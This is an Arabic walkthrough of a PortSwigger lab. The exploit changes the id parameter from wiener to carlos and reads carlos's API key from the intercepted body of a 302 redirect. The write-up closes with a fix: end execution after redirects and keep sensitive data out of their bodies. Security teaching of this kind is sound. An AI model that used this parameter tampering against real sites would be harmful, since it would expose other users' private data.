# [User ID controlled by request parameter with data leakage in redirect](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect)

## **`الهدف`**
الحصول على مفتاح الـ `API` الخاص بالمُستخدم `carlos` وتقديمه كحل.
## **`خطوات الحل`**
نقوم بالدخول إلى حساب `wiener:peter` ونقوم بتفعيل الـ `Intercept` وبعد ذلك نقوم بتعديل الـ `URL` الخاص بصفحتنا
```URL
https://0a6500e20435a5538091121e00f9001a.web-security-academy.net/my-account?id=wiener
```
لنضع اسم `carlos` بدلًا من `wiener`
```
https://0a6500e20435a5538091121e00f9001a.web-security-academy.net/my-account?id=carlos
```
ونلاحظ في الـ `response` الذي تم اعتراضه قد حدث تسريب بيانات
```http
HTTP/2 302 Found
Location: /login
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
<html>

                        <p>Your username is: carlos</p>
                        <div>Your API Key is: FhsEKd1OsH17fWsrv4l5OPgp2RuFFWxd</div><br/>
                      
</html>
```
فنقوم بنسخ مفتاح الـ `API` ثم نعود لحسابنا ونضغط على `Submit solution` ونضع مفتاح الـ `API` ونضغط `OK` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب على المُبرمج كتابة أمر صريح لإجبار السيرفر على إنهاء وإغلاق الـ `request` فورًا (‌‌كمثال، أمر إنهاء `die()` أو `exit()` في `PHP`) بمجرد اكتشاف أن المُستخدم لا يملك صلاحية للدخول، وأن يتم إرسال أمر إعادة التوجيه  (`302 Redirect` أو `403 Forbidden`)،

وكقاعدة أمنية عامة، يجب على أى `HTTP reponse` لا يحمل كود توجيه `200 OK` (ومشتقاته للبيانات المسموحة) وأن يكون مُحملًا بكود توجيه` (3xx)` أو كود خطأ `(4xx / 5xx)`  أن يكون مُلحقًا بأمر توقف برمجى صارم فوراً `(‌‌كمثال، أمر إنهاء die() أو exit()` في `PHP)` بعد تحديد كود الحالة `(Status Code)` لضمان عدم قراءة أي سطر تالي في الخلفية، وألا يحتوى الـ `Body` الخاص به على أى معلومات حساسة بل يجب أن يكون فارغ أو به جملة بسيطة مثل `Redirecting` أو `Unauthorized` (لأنه عادة ما يتذكر المٌبرمج في كود الـ `403 Forbidden` أو `405 Method Not Allowed` أنه يعود إلى صفحة خطأ، فغالبًا الكود يُكتب بطريقة صحيحة ويقفل هناك أو يعرض رسالة `Unauthorized` ، لكن في الـ `301,302 (Redirecting)`، المُبرمج قد يقع في فخ نفسي، حيث يتخيل أن السيرفر بمجرد أن يرى أمر التحويل، لا يكمل قراءة الصفحة ويتوجه مباشرة إلى الصفحة الجديدة.
